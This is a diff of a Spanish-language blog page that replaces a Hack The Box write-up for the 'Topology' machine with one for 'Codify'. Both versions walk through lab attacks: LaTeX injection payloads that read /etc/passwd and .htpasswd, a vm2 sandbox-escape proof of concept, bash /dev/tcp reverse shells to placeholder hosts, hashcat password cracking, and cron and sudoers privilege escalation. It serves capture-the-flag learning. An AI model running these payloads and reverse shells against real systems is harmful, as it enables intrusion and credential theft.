@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Topology &middot; Loaxert</title>
-  <meta name="title" content="Topology &middot; Loaxert" />
+  <title>Codify &middot; Loaxert</title>
+  <meta name="title" content="Codify &middot; Loaxert" />
   
   
-  <meta name="keywords" content="crontabs, linux, latex, sudo, subdominio, file-read, apache2, pspy64, gnuplot, " />
+  <meta name="keywords" content="python, sudoers, linux, pspy, vm2, sqlite3, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/htb/maquinas/topology/" />
+  <link rel="canonical" href="http://localhost:1313/htb/maquinas/codify/" />
   
   
   
@@ -70,26 +70,26 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/htb/maquinas/topology/">
+  <meta property="og:url" content="http://localhost:1313/htb/maquinas/codify/">
   <meta property="og:site_name" content="Loaxert">
-  <meta property="og:title" content="Topology">
-  <meta property="og:description" content="Descripción: # Una máquina en la que tenemos que hacer una inyección LaTeX para poder leer archivos y así conseguir el hash del usuario, para luego, mediante una tarea recurrente, ganar root.">
+  <meta property="og:title" content="Codify">
+  <meta property="og:description" content="Descripción: # Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.">
   <meta property="og:locale" content="es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="htb">
-    <meta property="article:published_time" content="2025-02-21T17:00:00-05:00">
-    <meta property="article:modified_time" content="2025-02-21T17:00:00-05:00">
-    <meta property="article:tag" content="Crontabs">
+    <meta property="article:published_time" content="2025-03-07T00:04:43-05:00">
+    <meta property="article:modified_time" content="2025-03-07T00:04:43-05:00">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Sudoers">
     <meta property="article:tag" content="Linux">
-    <meta property="article:tag" content="Latex">
-    <meta property="article:tag" content="Sudo">
-    <meta property="article:tag" content="Subdominio">
-    <meta property="article:tag" content="File-Read">
+    <meta property="article:tag" content="Pspy">
+    <meta property="article:tag" content="Vm2">
+    <meta property="article:tag" content="Sqlite3">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Topology">
-  <meta name="twitter:description" content="Descripción: # Una máquina en la que tenemos que hacer una inyección LaTeX para poder leer archivos y así conseguir el hash del usuario, para luego, mediante una tarea recurrente, ganar root.">
+  <meta name="twitter:title" content="Codify">
+  <meta name="twitter:description" content="Descripción: # Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.">
 
   
   <script type="application/ld+json">
@@ -97,26 +97,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Hack The Box",
-    "name": "Topology",
-    "headline": "Topology",
+    "name": "Codify",
+    "headline": "Codify",
     
-    "abstract": "Descripción: # Una máquina en la que tenemos que hacer una inyección LaTeX para poder leer archivos y así conseguir el hash del usuario, para luego, mediante una tarea recurrente, ganar root.",
+    "abstract": "Descripción: # Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.",
     "inLanguage": "es",
-    "url" : "http:\/\/localhost:1313\/htb\/maquinas\/topology\/",
+    "url" : "http:\/\/localhost:1313\/htb\/maquinas\/codify\/",
     "author" : {
       "@type": "Person",
       "name": "Santiago Chavarro"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-02-21T17:00:00-05:00",
-    "datePublished": "2025-02-21T17:00:00-05:00",
+    "dateCreated": "2025-03-07T00:04:43-05:00",
+    "datePublished": "2025-03-07T00:04:43-05:00",
     
-    "dateModified": "2025-02-21T17:00:00-05:00",
+    "dateModified": "2025-03-07T00:04:43-05:00",
     
-    "keywords": ["crontabs","linux","latex","sudo","subdominio","file-read","apache2","pspy64","gnuplot"],
+    "keywords": ["python","sudoers","linux","pspy","vm2","sqlite3"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "759"
+    "wordCount": "498"
   }]
   </script>
 
@@ -505,7 +505,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Topology
+      Codify
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -546,7 +546,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-21T17:00:00-05:00">21 febrero 2025</time>
+  <time datetime="2025-03-07T00:04:43-05:00">7 marzo 2025</time>
   
 
   
@@ -683,7 +683,7 @@
     </span>        
     
 </h3>
-<p>Una máquina en la que tenemos que hacer una inyección LaTeX para poder leer archivos y así conseguir el hash del usuario, para luego, mediante una tarea recurrente, ganar root.</p>
+<p>Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.</p>
 
 
 <h1 class="relative group">Enumeración 
@@ -697,25 +697,9 @@
     
 </h1>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn IP -oG allPorts
-</span></span></code></pre></div><ul>
-<li><code>-p-</code> Escanea todos los puertos <code>1-65535</code> .</li>
-<li><code>—open</code> Solo muestra los puertos que estén abiertos.</li>
-<li><code>-sS</code> Stealt scan, cambia el modo de escane haciendo que no se complete el hanshake.</li>
-<li><code>—min-rate 5000</code> Como mínimo va a enviar 5000 paquetes por segundo.</li>
-<li><code>-vvv</code> Aumenta la verbosidad, mostrando la máxima informacion posible mientras se ejecuta.</li>
-<li><code>-n</code> Desactiva la resolucion <code>DNS</code>; no va a tratar de resolver los nombres de dominio.</li>
-<li><code>-Pn</code> Nmap por defecto manda un ping a la IP; esto lo desactiva.</li>
-<li><code>-oG allPorts</code> Guarda el escaneo en formato <code>oG</code> en el archivo llamado <code>allPorts</code>.</li>
-</ul>
-<p>Este escaneo nos dio dos puertos: el 22 y el 80. Vamos a hacer un escaneo más exhaustivo a estos puertos.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sCV -p22,80 IP -A -oN target
-</span></span></code></pre></div><ul>
-<li><code>-sCV</code> Esto ejecuta una serie de scripts predeterminados de Nmap para obtener información adicional sobre los servicios que se encuentran abiertos, como versiones de servicios, detalles del sistema operativo, vulnerabilidades conocidas y la versión exacta.</li>
-<li><code>-p22, 80</code> Especifica qué puertos se van a escanear.</li>
-<li><code>-A</code> Activa el descubrimiento de sistema operativo, la deteccion de version, script scanning y hace un traceroute.</li>
-</ul>
-<p><a href="https://imgur.com/u8zXpKh"><img src="https://i.imgur.com/u8zXpKh.png" title="source: imgur.com" /></a></p>
-<p>La pagina HTTP que está en el puerto 80 usa Apache 2.4.41.</p>
+</span></span><span class="line"><span class="cl">nmap -sCV -p22,80,3000 -A -oN target IP
+</span></span></code></pre></div><p><a href="https://imgur.com/nKoR4C8"><img src="https://i.imgur.com/nKoR4C8.png" title="source: imgur.com" /></a></p>
+<p>Si tratamos de usar gobuster no encontraremos ningun subdominio ni subdirectorio interesante por lo que no lo voy a mostrar.</p>
 
 
 <h2 class="relative group">Puerto 80 
@@ -728,54 +712,68 @@
     </span>        
     
 </h2>
-<p><a href="https://imgur.com/P2kGwLQ"><img src="https://i.imgur.com/P2kGwLQ.png" title="source: imgur.com" /></a></p>
-<p>Al momento de entrar al link <code>“Latex Equation Generator”</code> veremos que es un subdmonio por lo que tendremos que agregarlo al <code>/etc/hosts</code> para que nos muestre lo siguiente.</p>
-<p><a href="https://imgur.com/T7QA4dq"><img src="https://i.imgur.com/T7QA4dq.png" title="source: imgur.com" /></a></p>
-<p>Algo que podemos tratar es listar los archivos dentro de este subdmonio por lo que vamos a ingresar a la siguiente <a href="http://latex.topology.htb/" target="_blank">URL</a> dejando el ultimo <code>/</code> .</p>
-<p><a href="https://imgur.com/aTp681K"><img src="https://i.imgur.com/aTp681K.png" title="source: imgur.com" /></a></p>
-<p>Revisando los archivos, lo único útil está en <code>equationtest.tex</code> ya que nos muestra cómo estan tratando la entrada Latex la web.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="k">\documentclass</span><span class="nb">{</span>standalone<span class="nb">}</span>
-</span></span><span class="line"><span class="cl"><span class="k">\input</span><span class="nb">{</span>header<span class="nb">}</span>
-</span></span><span class="line"><span class="cl"><span class="k">\begin</span><span class="nb">{</span>document<span class="nb">}</span>
+<p><a href="https://imgur.com/k6NZ39V"><img src="https://i.imgur.com/k6NZ39V.png" title="source: imgur.com" /></a></p>
+<p><a href="https://imgur.com/vlx4cMA"><img src="https://i.imgur.com/vlx4cMA.png" title="source: imgur.com" /></a></p>
+<p>Podemos ver como tenemos la posibilidad de ejecutar comandos <code>node.js</code> usando la libreria vm2 ademas de esto no vamos a encontrar nada más intreresante por lo que vamos a buscar vulnerabilidades de la libreria.</p>
+<p>Encontraremos la siguiente poc para la libreria en github que es la que vamos a estar usando <a href="https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d" target="_blank">POC</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm2&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\int</span><span class="nb">_{a}^b</span><span class="nv">\int</span><span class="nb">_{c}^d f</span><span class="o">(</span><span class="nb">x,y</span><span class="o">)</span><span class="nb">dxdy </span><span class="s">$</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="sb">`
+</span></span></span><span class="line"><span class="cl"><span class="sb">err = {};
+</span></span></span><span class="line"><span class="cl"><span class="sb">const handler = {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    getPrototypeOf(target) {
+</span></span></span><span class="line"><span class="cl"><span class="sb">        (function stack() {
+</span></span></span><span class="line"><span class="cl"><span class="sb">            new Error().stack;
+</span></span></span><span class="line"><span class="cl"><span class="sb">            stack();
+</span></span></span><span class="line"><span class="cl"><span class="sb">        })();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    }
+</span></span></span><span class="line"><span class="cl"><span class="sb">};
+</span></span></span><span class="line"><span class="cl"><span class="sb">  
+</span></span></span><span class="line"><span class="cl"><span class="sb">const proxiedErr = new Proxy(err, handler);
+</span></span></span><span class="line"><span class="cl"><span class="sb">try {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    throw proxiedErr;
+</span></span></span><span class="line"><span class="cl"><span class="sb">} catch ({constructor: c}) {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    c.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;touch pwned&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="sb">}
+</span></span></span><span class="line"><span class="cl"><span class="sb">`</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">\end</span><span class="nb">{</span>document<span class="nb">}</span>
-</span></span></code></pre></div><p>Podemos observar que la entrada está entre los signos de dólar. Leyendo la página, nos dicen que LaTeX está en el modo “<a href="https://www.physicsread.com/latex-math-mode/" target="_blank">inline math</a>”. Buscando acerca de este modo, nos encontramos con que hay tres formas de tratarlo:</p>
-<ol>
-<li>$ . . .$</li>
-<li>\begin{math} . . . \end{math}</li>
-<li>( . . . )</li>
-</ol>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/EwJLJfF"><img src="https://i.imgur.com/EwJLJfF.png" title="source: imgur.com" /></a></p>
 
 
-<h1 class="relative group">Foothold 
-    <div id="foothold" class="anchor"></div>
+<h1 class="relative group">User 
+    <div id="user" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#foothold" aria-label="Ancla">#</a>
+            style="text-decoration-line: none !important;" href="#user" aria-label="Ancla">#</a>
     </span>        
     
 </h1>
-<p>Por lo que ahora sabemos porque está entre esos signos y confirmamos que la entrada va a estar así planeando una inyección.</p>
-<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection" target="_blank">PayloadsAllTheThings</a></p>
-<p>Vamos a tratar de empezar a leer archivos del sistema con la inyección de codigo.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">etc</span><span class="o">/</span><span class="nb">passwd} </span><span class="s">$</span>
-</span></span></code></pre></div><p><a href="https://imgur.com/eFdUTzY"><img src="https://i.imgur.com/eFdUTzY.png" title="source: imgur.com" /></a></p>
-<p>Una vez confirmamos que podemos leer archivos vamos a empezar a leer archivos de configuración que nos permitán ingresar al sistema.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">etc</span><span class="o">/</span><span class="nb">apache</span><span class="m">2</span><span class="o">/</span><span class="nb">sites</span><span class="o">-</span><span class="nb">enabled</span><span class="o">/</span><span class="m">000</span><span class="o">-</span><span class="nb">default.conf} </span><span class="s">$</span>
-</span></span></code></pre></div><p>En este archivo encontramos varios directorios entre ellos uno que pertence al subdominio <code>dev.topology.htb</code> lo agregamos al <code>/etc/hosts</code> y al ingresar nos pide una contraseña.</p>
-<p>Vamos a listar archivos de configuracion por defecto de apache sobre el directorio correspondiente a este subdominio.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">var</span><span class="o">/</span><span class="nb">www</span><span class="o">/</span><span class="nb">dev</span><span class="o">/</span><span class="nb">.htaccess} </span><span class="s">$</span>
-</span></span></code></pre></div><p><a href="https://imgur.com/pH0zQXZ"><img src="https://i.imgur.com/pH0zQXZ.png" title="source: imgur.com" /></a></p>
-<p>Por ultimo vamos a listar este archivo.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">var</span><span class="o">/</span><span class="nb">www</span><span class="o">/</span><span class="nb">dev</span><span class="o">/</span><span class="nb">.htpasswd} </span><span class="s">$</span>
-</span></span></code></pre></div><p>Nos vamos a encontrar un usuario junto con su hash, vamos a copiarlo y guardarlo en un archivo <code>.txt</code> para hacerle fuerza bruta con <code>hashcat</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="nb">hash</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">wordlist</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlist</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">user</span>
-</span></span></code></pre></div><p>Esto nos dara su contraseña para iniciar sesion mediante ssh.</p>
-
+<p>Ya con esto vamos a poder ejecutar comandos y asi montar una revshell,  nos dirigiremos a la pagina <a href="https://www.revshells.com/" target="_blank">RevShells</a> y en nuestra poc ejecutaremos el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Primero ponte en escucha en tu maquina (el siguiente comando)</span>
+</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/IP/PUERTO 0&gt;&amp;1&#34;</span> 
+</span></span></code></pre></div><p>Y nos pondremos en escucha con netcat en nuestra maquina local:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp PUERTO
+</span></span></code></pre></div><p>Ya con esto le pediremos a la pagina que ejecute nuestro codigo.</p>
+<p><a href="https://imgur.com/BgatqgV"><img src="https://i.imgur.com/BgatqgV.png" title="source: imgur.com" /></a></p>
+<p>Listo lo primero es hacer el tratamiento de la <code>tty</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">Ctrl + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">reset xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><p>Ya en esta parte con find podemos encontrar una base de datos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find /var/www/ -name *.db 2&gt;/dev/null
+</span></span></code></pre></div><p>Y veremos que hay una base de datos, usando file nos daremos cuenta que es una base de datos <code>sqlite</code>:</p>
+<p><a href="https://imgur.com/oYNhrQB"><img src="https://i.imgur.com/oYNhrQB.png" title="source: imgur.com" /></a></p>
+<p>Con esto podremos ver la base de datos que dentro tiene un hash:</p>
+<p><a href="https://imgur.com/YydnXgR"><img src="https://i.imgur.com/YydnXgR.png" title="source: imgur.com" /></a></p>
+<p>Y con el siguiente comando de hashcat podremos obtener la contraseña para ingresar como <code>joshua</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt -m <span class="m">3200</span>
+</span></span></code></pre></div>
 
 <h1 class="relative group">Root 
     <div id="root" class="anchor"></div>
@@ -787,42 +785,17 @@
     </span>        
     
 </h1>
-
-
-<h2 class="relative group">Enumeración 
-    <div id="enumeraci%C3%B3n-1" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#enumeraci%C3%B3n-1" aria-label="Ancla">#</a>
-    </span>        
-    
-</h2>
-<p>Primero vamos a hacer el tratamiento basico de la shell:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-</span></span></code></pre></div><p>Listo ahora vamos a tratar de listar archivos y permisos a ver si encontramos algo, pero nos daremos cuenta rapidamente que no tenemos permitido el uso de sudo ni ningun permiso extraño por lo que lo unico que puede tener algo interesante son las crontab pero no nos permiten listarlas entonces vamos a usar la herramienta <a href="https://github.com/DominicBreuker/pspy/tree/master" target="_blank">Pspy</a>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Maquina atacante </span>
-</span></span><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#Maquina victima</span>
-</span></span><span class="line"><span class="cl">wget IP/pspy64
-</span></span><span class="line"><span class="cl">chmod +x pspy64 
-</span></span><span class="line"><span class="cl">./pspy64
-</span></span></code></pre></div><p>Luego de ejecutar el ultimo comando si esperamos un rato podremos ver que hay una script que se ejecuta cada minuto <code>/opt/gnuplot/getdata.sh</code> .</p>
-<p><a href="https://imgur.com/9ry28PV"><img src="https://i.imgur.com/9ry28PV.png" title="source: imgur.com" /></a></p>
-<p>Si analizamos esta salida nos daremos cuenta que lo que se esta haciendo cada minuto es buscar en el directorio <code>/opt/gnuplot/</code> todos los archivos con extension <code>plt</code> y los ejecuta.</p>
-<p>Si tratamos de ingresar al directorio no nos lo permite pero en cambio si creamos un archivo y lo movemos a esa direccion no habra ningun conflicto. Buscando escalaciones de privilegios con <code>gnuplot</code> que es el binario que se ejecuta encontramos la siguiente <a href="https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/gnuplot-privilege-escalation" target="_blank">Exploit</a>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Maquina atacante</span>
-</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#Maquina victima</span>
-</span></span><span class="line"><span class="cl">nano rev.plt
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">system <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&#39;&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">mv rev.plt /opt/gnuplot/
-</span></span></code></pre></div><p>Con esto tendremos acceso como root y habremos completado la maquina.</p>
+<p><a href="https://imgur.com/GNcDqoF"><img src="https://i.imgur.com/GNcDqoF.png" title="source: imgur.com" /></a></p>
+<p>Enumerando encontramos este script que tenemos permiso de ejecutar como sudo:</p>
+<p><a href="https://imgur.com/AGLmyCR"><img src="https://i.imgur.com/AGLmyCR.png" title="source: imgur.com" /></a></p>
+<p>Si vemos el script esta mal montado por lo que cuando pida la contraseña podemos usar el * y nos dira que es correcto esto debido a que si no usamos dobles comillas para esas variables <code>DB_PASS</code> y <code>USER_PASS</code> podemos usar el * de forma que sin importar cual se la contraseña nos la dara como correcta esto tambien nos habilita la opcion de obtener la contraseña con python. Aquí un ejemplo de porque esto pasa:</p>
+<p><a href="https://imgur.com/WVdk3uj"><img src="https://i.imgur.com/WVdk3uj.png" title="source: imgur.com" /></a></p>
+<p>Para poder interceptar la contraseña vamos a usar <a href="https://www.notion.so/Pspy-1a1094373800803aaa8bcb2094703815?pvs=21" target="_blank">pspy</a> igual que en las anteriores maquinas que lo hemos usado.</p>
+<p><a href="https://imgur.com/gLNcKij"><img src="https://i.imgur.com/gLNcKij.png" title="source: imgur.com" /></a></p>
+<p>Y ahi tenemos la contraseña.</p>
+<blockquote>
+<p>Si tienen curiosiodad de como se hacia mediante el script de python pueden ver esta parte del directo de <a href="https://youtu.be/H7-Jd6HaLbI?t=2129" target="_blank">s4vitar</a>.</p>
+</blockquote>
 
           
           
@@ -845,8 +818,8 @@
           
         
       <script>
-        var oid = "views_HTB\/Maquinas\/topology.md"
-        var oid_likes = "likes_HTB\/Maquinas\/topology.md"
+        var oid = "views_HTB\/Maquinas\/codify.md"
+        var oid_likes = "likes_HTB\/Maquinas\/codify.md"
       </script>
       
       
@@ -866,7 +839,7 @@
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/htb/maquinas/greenhorn/">
+            <a class="flex group mr-3" href="/htb/maquinas/topology/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -878,11 +851,11 @@
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >GreenHorn</span
+                  >Topology</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2024-11-30T17:00:00-05:00">30 noviembre 2024</time>
+                    <time datetime="2025-02-21T17:00:00-05:00">21 febrero 2025</time>
                   
                 </span>
               </span>
@@ -890,28 +863,6 @@
           
         </span>
         <span>
-          
-            <a class="flex text-right group ml-3" href="/htb/maquinas/codify/">
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Codify</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-03-07T00:04:43-05:00">7 marzo 2025</time>
-                  
-                </span>
-              </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-            </a>
           
         </span>
       </div>
